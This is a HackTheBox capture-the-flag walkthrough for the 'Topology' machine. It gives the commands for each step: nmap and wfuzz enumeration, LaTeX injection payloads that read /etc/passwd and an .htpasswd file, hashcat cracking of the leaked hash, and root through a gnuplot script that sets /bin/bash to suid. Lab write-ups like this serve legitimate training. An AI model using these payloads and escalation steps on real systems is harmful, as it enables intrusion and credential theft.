<h2>Target: 10.10.11.217 Topology </h2>

<b>Initial Access:</b><br>
Step 1: nmap -Pn 10.10.11.217 --min-rate=5000 -p-|grep open|awk -F '/' '{print $1}'|tr '\n' ','  <br>
Nmap shows port 22 and 80 are open.

Step 2: Enumerate these open ports further with nmap: nmap -Pn 10.10.11.217 --min-rate=5000 -p 22,80 -sC -sV -oN nmap-topology

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/c996b385-68a5-4091-914b-a5a9f26ec74a) 
 
Step 3: Navigating to port 80 shows: 

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/e424c1ba-5f73-4605-b274-8143553fe331) 
 
The page shows an email lklein@topology.htb.  Add into the file /etc/hosts: 10.10.11.217 topology.htb

Step 4: Run subdomain enumeration on topology.htb: wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H “Host: FUZZ.topology.htb” -u “http://topology.htb” --hh 6767



![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/1fdc6552-10d4-4041-a78f-e007ae25fe1a) 
 
Wfuzz found 2 subdomains: dev and stats.  Add those into the file /etc/hosts: 10.10.11.217 topology.htb dev.topology.htb stats.topology.htb

Step 5: Navigating to dev.topology.htb shows:

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/a600aa04-cdd3-4be9-9c9c-a535a044285d) 

Weak credentials don’t work for login and we don’t have credentials so seems like a dead end for now.

Step 6: Navigating port 80 further, we find a ‘LaTeX Equation Generator’ which has a link to http://latex.topology.htb/equation.php.  Add this subdomain into the file /etc/hosts: 10.10.11.217  topology.htb  dev.topology.htb  stats.topology.htb  latex.topology.htb

Navigate to http://latex.topology.htb/equation.php:

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/38d86a8e-830a-452e-9006-18af542258ad) 

Google search ‘latex exploit’ finds latex injection articles.  

Step 7: Enter into the input field: `$\lstinputlisting{/etc/passwd}$`

Click on ‘Generate’.  The page shows the contents to /etc/passwd:

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/799e6a20-bcf2-4d20-b7f5-b45ea689650e) 
 
Step 8: Check if we can use this lfi to find credentials to dev.topology.htb.  Try reading /var/www/dev/.htpasswd by using payload `$\lstinputlisting{/var/www/dev/.htpasswd}$`:

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/377a8d97-70be-43be-8f35-0f4e3bcb80a2) 
 
It works, we found credentials.  

Step 9: Save the credentials image to a file (we will call the filename ‘equation.png’).  An easy way to convert a png file to text is to run the command: tesseract equation.png credentials.txt

Step 10: Now that we have the credentials as text, try to crack the hash.  First, delete the username ‘vdaisley’ and the colon so that the file contains the hash only.  Next, figure out what type of hash is being used: nth -f credentials.txt

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/a9a1b52d-1c81-4e96-afc4-c91e330144e9) 
  
Nth shows that the hash is md5.  

Step 11: Crack the hash: hashcat -m 1600 credentials.txt /usr/share/wordlists/rockyou.txt

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/1b68ddc6-d640-4908-b49e-83ae80a29422) 
 
Hashcat cracked the password: calculus20

Step 12: Try logging into ssh using these credentials: ssh vdaisley@topology.htb → enter password when prompted.

We have shell as user vdaisley.  We can get the flag in /home/vdaisley/user.txt
___________________________________________________________________
<b>Privilege Escalation:</b><br>
Step 1: Upload pspy to the target shell

Step 2: Run pspy to check for running processes: 

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/408d97c5-dd78-4afa-9a1f-221eec55c7fd) 
 
Pspy shows some processes running as root from directory /opt/gnuplot.

Step 3: Check file permissions on /opt/gnuplot: ls -al /opt/gnuplot

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/0a1ea25e-6aaf-4170-9e9d-f12fabe45bf5) 
 
We have write permissions to directory /opt/gnuplot. 

Step 4: Google search ‘gnuplot priv esc’ shows articles of how to run commands with gnuplot.  

Write a file on the target shell named test.plt with the contents of: system “chmod 4755 /bin/bash”

Step 5: Move the file test.plt to /opt/gnuplot: mv test.plt /opt/gnuplot

Once the background process runs, it will run test.plt as root and thereby change /bin/bash to suid.

Step 6: Wait a minute for the process to run and then run the command: /bin/bash -p

We have shell as root.  We can get the flag in /root/root.txt
